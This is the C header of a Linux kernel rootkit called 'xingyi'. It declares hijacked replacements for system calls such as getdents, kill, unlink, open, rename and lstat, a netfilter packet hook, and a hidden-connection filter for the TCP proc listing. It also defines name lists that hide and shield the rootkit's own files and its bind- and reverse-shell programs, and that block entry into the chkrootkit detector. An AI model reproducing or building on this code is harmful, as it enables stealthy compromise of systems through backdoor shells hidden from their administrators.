#ifndef _xingyi_kern_source_H_
#define _xingyi_kern_source_H_

#define NAME_OFFSET(de) ((int) ((de)->d_name - (char __user *) (de)))
#define END {set_fs(old_fs);}
#define KERN {old_fs=get_fs(); set_fs(KERNEL_DS);}
#define _NR_unlink_ 1
#define _NR_kill_ 2
#define _NR_open_ 3
#define _NR_rmdir_ 4
#define _NR_rename_ 5
#define _NR_chdir_ 6
#define _NR_lstat_ 7
#define TMPSZ 150
#if(LINUX_VERSION_CODE >= KERNEL_VERSION(2,6,19))
	typedef u64 ino_t_u64;
#else 
	typedef ino_t ino_t_u64;
#endif
typedef int boolean;
mm_segment_t old_fs;
char hasil_konversi[10];
char *_lemme = NULL;
char *_reverse_shell_port_str = NULL;
char *_bind_shell_port_str = NULL;
boolean d_name_found;
int totheap = 0, _hook_net = 0, _kernel_file_ops = 0;
static int TRUE = 1;
static int FALSE = 0;
static int base_size = 256;
const struct file_operations *rk_fops;
static struct nf_hook_ops nf_hook_in; 
static struct tcphdr *tcp_header;
static struct iphdr *ip_header;
static struct file *ev1l_proc = NULL;
/* faking structures for original linux kernel structures */
#if defined(__i386__) || defined(__i486__)  || defined(__i586__)  || defined(__i686__) 
struct rk_linux_dirent64 {
	u64		d_ino;
	s64		d_off;
	unsigned short	d_reclen;
	unsigned char	d_type;
	char		d_name[0];
};
struct rk_getdents_callback64 {
	#if(LINUX_VERSION_CODE >=  KERNEL_VERSION(3,11,0))
	struct dir_context ctx;
	#endif
	struct rk_linux_dirent64 __user * current_dir;
	struct rk_linux_dirent64 __user * previous;
	int count;
	int error;
};
#endif
#if defined(__x86_64__) || defined(__amd64__)
struct rk_linux_dirent {
	unsigned long	d_ino;
	unsigned long	d_off;
	unsigned short	d_reclen;
	char		d_name[1];
};

struct rk_getdents_callback {
#if(LINUX_VERSION_CODE >=  KERNEL_VERSION(3,11,0))
	struct dir_context ctx;
#endif
	struct rk_linux_dirent __user * current_dir;
	struct rk_linux_dirent __user * previous;
	int count;
	int error;
};
#endif
#if (LINUX_VERSION_CODE < KERNEL_VERSION(2,6,18))
asmlinkage long (*unlink_asli)(const char __user *pathname);
#endif
#if (LINUX_VERSION_CODE >= KERNEL_VERSION(2,6,18))
asmlinkage long (*unlinkat_asli)(int dfd, const char __user * pathname, int flag);
#endif
asmlinkage long (*chdir_asli)(const char __user *filename);
asmlinkage long (*rmdir_asli)(const char __user *pathname);
asmlinkage long (*rename_asli)(const char __user *oldname,const char __user *newname);
asmlinkage long (*kill_asli)(int pid, int sig);
asmlinkage long (*open_asli)(const char __user *filename,int flags, int mode);
asmlinkage long (*dup_asli)(unsigned int fildes);
asmlinkage long (*write_asli)(unsigned int fd, const char __user *buf,size_t count);
#if defined(__x86_64__) || defined(__amd64__)
asmlinkage long (*getdents_asli)(unsigned int fd, char __user *buf, size_t count);
#endif
#if defined(__i386__) || defined(__i486__)  || defined(__i586__)  || defined(__i686__)  
asmlinkage long (*getdents64_asli)(unsigned int fd, struct rk_linux_dirent64 __user * dirent, unsigned int count);
#endif
#if defined(__x86_64__) || defined(__amd64__)
asmlinkage long (*lstat_asli)(char __user *filename, struct __old_kernel_stat __user *statbuf) ;
#endif
#if defined(__i386__) || defined(__i486__)  || defined(__i586__)  || defined(__i686__)
asmlinkage long (*lstat64_asli)(char __user *filename, struct stat64 __user *statbuf);
#endif
/* rk funcs*/
#if (LINUX_VERSION_CODE < KERNEL_VERSION(3,11,0))
static int (*real_tcp4_seq_show)(struct seq_file *seq, void *v);
static int rk_tcp4_seq_show(struct seq_file *seq, void *v);
#endif
#if defined(__x86_64__) || defined(__amd64__)
	static int rk_filldir(void * __buf, const char * name, int namlen, loff_t offset, ino_t_u64 ino, unsigned int d_type);
	static asmlinkage long *cr_getdents(unsigned int fd, struct rk_linux_dirent __user *dirent, unsigned int count);
#else
	static int rk_filldir64(void * __buf, const char * name, int namlen, loff_t offset, ino_t_u64 ino, unsigned int d_type);
	static asmlinkage long *cr_getdents64(unsigned int fd, struct rk_linux_dirent64 __user * dirent, unsigned int count);
#endif
static asmlinkage long *cr_rename(const char __user *oldname, const char __user *newname);
static asmlinkage long *cr_rmdir(const char __user *pathname);
static asmlinkage long *cr_chdir(const char __user *filename);
static asmlinkage long *cr_kill(int pid, int sig);
#if(LINUX_VERSION_CODE >= KERNEL_VERSION(2,6,18))
static asmlinkage long *cr_unlinkat(int dfd, const char __user * pathname, int flag);
#endif
#if(LINUX_VERSION_CODE <= KERNEL_VERSION(2,6,17))
static asmlinkage long *cr_unlink(const char __user *pathname);
#endif
static asmlinkage long *cr_dup(unsigned int fildes);
#if defined(__x86_64__) || defined(__amd64__)
static asmlinkage long *cr_lstat(char __user *filename, struct __old_kernel_stat __user *statbuf); 
#endif
#if defined(__i386__) || defined(__i486__)  || defined(__i586__)  || defined(__i686__) 
static asmlinkage long *cr_lstat64(char __user *filename, struct stat64 __user *statbuf); 
#endif
static inline int userspace_elf(char *cmd, char *elf_arg);
static inline char *crinst(int nomer);
static inline char *n_vmalloc(ssize_t size);
static inline char *n_kmalloc(ssize_t size);
static inline char *cr_read6char(char *path);
static inline char *trim(char *str);
static inline char *ltrim(char *str);
static inline char *rtrim(char *str);
static inline int atoi(char *str);
static inline int cr_repop(char *cr0_argumen, int cr_mode);
static inline unsigned int rk_nf_hook(unsigned int hooknum, struct sk_buff *skb, const struct net_device *in, const struct net_device *out, int (*okfn)(struct sk_buff*));
/* eof rk funcs */
static char fingerprint_unlink[3][12] = {{"xingyi"}, {"bindshel"}, {"reverse_shel"}};
static char fingerprint_getdents[2][7] = {{"xingyi"}, {"install"}};
static char fingerprint_kill[2][12] = {{"bindshel"}, {"reverse_shel"}};
static char fingerprint_open[2][7] = {{"xingyi"}, {"install"}};
static char fingerprint_rmdir[3][6] = {{"xingyi"}, {"/tmp"}, {"/bin"}};
static char fingerprint_rename[5][12] = {{"xingyi"}, {"bindshel"}, {"reverse_shel"}, {"/tmp"}, {"/bin/"}};
static char fingerprint_chdir[2][10] = {{"xingyi"},{"chkrootkit"}};
static char fingerprint_lstat[3][12] = {{"xingyi"}, {"bindshel"}, {"reverse_shel"}};
unsigned int _num_fingerprint_unlink = (int)(sizeof(fingerprint_unlink) / sizeof(*fingerprint_unlink));
unsigned int _num_fingerprint_getdents = (int)(sizeof(fingerprint_getdents) / sizeof(*fingerprint_getdents));
unsigned int _num_fingerprint_kill = (int)(sizeof(fingerprint_kill) / sizeof(*fingerprint_kill));
unsigned int _num_fingerprint_open = (int)(sizeof(fingerprint_open) / sizeof(*fingerprint_open));
unsigned int _num_fingerprint_rmdir = (int)(sizeof(fingerprint_rmdir) / sizeof(*fingerprint_rmdir));
unsigned int _num_fingerprint_rename = (int)(sizeof(fingerprint_rename) / sizeof(*fingerprint_rename));
unsigned int _num_fingerprint_chdir = (int)(sizeof(fingerprint_chdir) / sizeof(*fingerprint_chdir));
unsigned int _num_fingerprint_lstat = (int)(sizeof(fingerprint_lstat) / sizeof(*fingerprint_lstat));
unsigned int _num_cmd_blocked = (int)(sizeof(cmd_blocked) / sizeof(*cmd_blocked));
unsigned int _bind_run = 0;
#endif
